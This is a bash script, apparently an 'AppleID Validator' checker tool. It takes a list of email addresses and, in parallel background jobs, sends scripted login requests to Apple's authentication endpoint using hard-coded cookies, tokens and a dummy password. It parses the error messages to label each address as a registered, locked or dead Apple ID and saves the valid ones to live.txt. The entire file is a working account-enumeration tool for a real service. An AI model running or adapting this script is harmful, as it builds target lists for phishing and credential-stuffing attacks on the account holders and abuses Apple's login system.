
#!/bin/bash

RED='\e[31m'
CYAN='\e[36m'
YELLOW='\e[33m'
ORANGE='\e[33m' 
PUR='\033[35m'
GRN="\e[32m"
WHI="\e[37m"
NC='\e[0m'
b=$(tput bold)
printf "$NC\n"
cat <<EOF
---------------------------------------------------
   iNoob Checker - AppleID Validator 2019
---------------------------------------------------
EOF
while getopts ":i:r:l:t:dchu" o; do
    case "${o}" in
        i)
            list=${OPTARG}
            ;;
        r)
            folderto=${OPTARG}
            ;;
        l)
            listto=${OPTARG}
            ;;
        d)
            hapud='y'
            ;;
    esac
done
if [[ $list == '' || $folderto == '' || $listto == '' ]]; then
  cli_mode="interactive"
else
  cli_mode="interpreter"
fi
if [ -z "${hapud}" ]; then
  hapud='n'
fi
SECONDS=0
if [[ $list == '' ]]; then
  printf "$GRN"
  printf $b
  ls
  printf "$NC"
  read -p "List? " list
fi
if [[ $folderto == '' ]]; then
  read -p "Save folder to ? " folderto
  # Check if result folder exists
  # then create if it didn't
  if [[ ! -d "$folderto" ]]; then
    mkdir $folderto
  else
    read -p "Folder are exists, append to them (y/n) ? " isAppend
    if [[ $isAppend == 'n' ]]; then
      exit
    fi
  fi
else
  if [[ ! -d "$folderto" ]]; then
    mkdir $folderto
  fi
fi
if [[ $hapud == '' || $cli_mode == 'interactive' ]]; then
  read -p "Delete list per check (y/n) ? " hapud
fi
checkapple() {
  SECONDS=0
  scnt="$(echo "$resp" | grep "scnt: " | cut -c7- | xargs)"
  check=`curl 'https://idmsac.apple.com/authenticate' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: https://idmsac.apple.com' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: https://idmsac.apple.com/authenticate' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' -H 'Cookie: JSESSIONID=A96A5947B68670D6B96545BB1124DCBD; geo=ID; ccl=JTwIRAwfqHmGCt+CsjQzAg==; s_fid=25DAEEEB3328E146-380111B3AFD60ECD; s_cc=true; s_vi=[CS]v1|2E3DC447052E1CE7-40002C4FA00008C5[CE]; dslang=US-EN; site=USA; ndcd=wc1.1.w-046483.1.2.n0IAqxm5xXnekn2_VqvUtg%252C%252C.qoHZVZ8bPdMmBtVdN_M74G7BqSMC57eFHgg27qVWXjttyPWK82DHcAxALh2bYXm8X-CHXLNbptGaVuLOI70oC0wIy04hkuR7mL4pxP9K6XBpjxyiNpgadh_AQFx5SG9KBIxdt1Uz_z873I3Ihu6Tb68HqTr_2GQJtfz0rUKAUAqrlpz0psZso8Ab5xsyRs7R; s_pathLength=errorpage%3D2%2C; s_ptc=0.039%5E%5E0.000%5E%5E0.000%5E%5E0.000%5E%5E0.227%5E%5E0.003%5E%5E0.924%5E%5E0.008%5E%5E0.017%5E%5E0.950%5E%5E0.000%5E%5E1.249; X-Apple-I-Web-Token=AAAAKjR8N2Y4M2YyMGYzODAxZmQxZDhmMmU1ZDRkMzEyYzI3NzkAAAFpQqBKqh/bDEqmT2HWLq5+pHkFPkGLHBJYLly37jx4WijMn+oF366D2FLYlI+lM/sDYg6a0LdWEpQDQsi1HlGdlM80z4iMhXDDyD9hEMGYVxJkpS6xBsx8N0JK9AmM5y3NHo2nAHhuDZcqd3tnoM4QRhq9exh2fjIGyORK47YMxmvcA9CWLgQVd0vp93reFagu1sUwT/oNoSiQ9Nf4IMOeA0qDDEOWK8YQAt2CpHZ2dMZKW2KIwYWGmz4gY1VHFumftyGxAAx+Ww1UcGuO/J5IaKaeXpp++O38Za+PlC84QpfqyQwVaCp59M10pQ==' --data 'openiForgotInNewWindow=false&fdcBrowserData=%7B%22U%22%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F72.0.3626.119+Safari%2F537.36%22%2C%22L%22%3A%22id-ID%22%2C%22Z%22%3A%22GMT%2B07%3A00%22%2C%22V%22%3A%221.1%22%2C%22F%22%3A%22F8a44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZr_WhXTA2s.XTVV26y8GGEDd5ihORoVyFGh8cmvSuCKzIlnY6xljQlpRD_KQnH0FABjQqgXK_Pmtd0SHp815LyjaY2.rINj.rIN4WzcjftckcKyAd65hz74WySXvOxwawgCgIlNU.3Io3.Nzl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWoefTPF90O_vTpZHgfLMC7AvIg.jEfuyPBDovJn_JnmccbguaDeyjaY2ftckuyPBDjaY1HGOg3ZLQ0I5913V48idQmr_D.RdPQp4nHbB7Q_H.4tFSGYidKw.KBN.eNHRZtG2htILpOeISFQ_H.4tKSQgFY5BNlr9cNlY5QB4bVNjMk.64M%22%7D&appleId='$1'&accountPassword=Jancok123&appIdKey=c991a1687d72e54d35d951a58cf7aa33fe722353b48f89d27c1ea2ffa08a4b80&accNameLocked=false&language=US-EN&path=%2Fjibe&rv=5&requestUri=%2Fauthenticate&Env=PROD&referer=https%3A%2F%2Fwww.google.com%2F&scnt='$scnt'&clientInfo=%7B%22U%22%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F72.0.3626.119+Safari%2F537.36%22%2C%22L%22%3A%22id-ID%22%2C%22Z%22%3A%22GMT%2B07%3A00%22%2C%22V%22%3A%221.1%22%2C%22F%22%3A%22F8a44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZr_WhXTA2s.XTVV26y8GGEDd5ihORoVyFGh8cmvSuCKzIlnY6xljQlpRD_KQnH0FABjQqgXK_Pmtd0SHp815LyjaY2.rINj.rIN4WzcjftckcKyAd65hz74WySXvOxwawgCgIlNU.3Io3.Nzl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWoefTPF90O_vTpZHgfLMC7AvIg.jEfuyPBDovJn_JnmccbguaDeyjaY2ftckuyPBDjaY1HGOg3ZLQ0I5913V48irPwhtIV69LaxGRodn15tJV0TJ6JNv_CU.4I5.9a3b8DJFvTJphLPZrJ5tJV0TKMLv37lY5BSme5BNlan0Os5Apw.30N%22%7D' --compressed -D - -s -L`
  duration=$SECONDS
  header="iNoob - `date +%H:%M:%S`"
  footer="[iNoob - AppleValid 2019]\n"
  val="$(echo "$check" | grep -c 'Application has insufficient privileges to perform this action')"
  inv="$(echo "$check" | grep -c 'Your Apple ID or password was entered incorrectly.')"
  lock="$(echo "$check" | grep -c 'This Apple ID has been locked')"

  if [[ $val > 0 ]]; then
    echo -n -e "[$header - Line > $2 - Line Remaining > $3 ] ${ORANGE}$b Registered on Apple ${NC} > $1 $footer"
    echo "$1" >> $4/live.txt
  else
    if [[ $lock > 0 ]]; then
      echo -n -e "[$header - Line > $2 - Line Remaining > $3 ] ${RED}$b LIVE BUT LOCKED ${NC} > $1 $footer"
      echo "$1" >> $4/live.txt
  else
    if [[ $inv > 0 ]]; then
      echo -n -e "[$header - Line > $2 - Line Remaining > $3 ] ${RED}$b DEAD ${NC} > $1 $footer"
      echo "$1" >> $4/die.txt
    else
      echo -n -e "[$header - Line > $2 - Line Remaining > $3 ] ${CYAN} Unkown${NC} > $1 $footer"
      echo "$1 => $check" >> reason.txt
      echo "$1" >> $list
    fi
  fi
fi
  printf "\r"
  }
if [[ ! -f $list ]]; then
  echo "[404] File mailist not found. Check your mailist file name."
  ls -l
  exit
fi
echo "[=] Waiting for validate your mailist ...."
grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' $list | tr '[:upper:]' '[:lower:]' | sort | uniq > temp_list && mv temp_list $list
linetotalsal=`grep -c "@" $list`
IFS=$'\r\n' GLOBIGNORE='*' command eval  'mailist=($(cat $list))'
con=1

for (( i = 0; i < "${#mailist[@]}"; i++ )); do
  nameu="${mailist[$i]}"
  indx=$((con++))
  totals=$((linetotalsal--))
  fold=`expr $i`
  if [[ $fold == 0 && $i > 0 ]]; then
    header="`date +%H:%M:%S`"
    duration=$SECONDS
  fi
  checkapple "$nameu" "$indx" "$totals" "$folderto" "$list" &
  if [[ $hapud == 'y' ]]; then
    grep -v -- "$nameu" $list > "$list"_temp && mv "$list"_temp $list
  fi
done 
echo "\n"
wait
#rm $list
duration=$SECONDS
echo "$(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed."
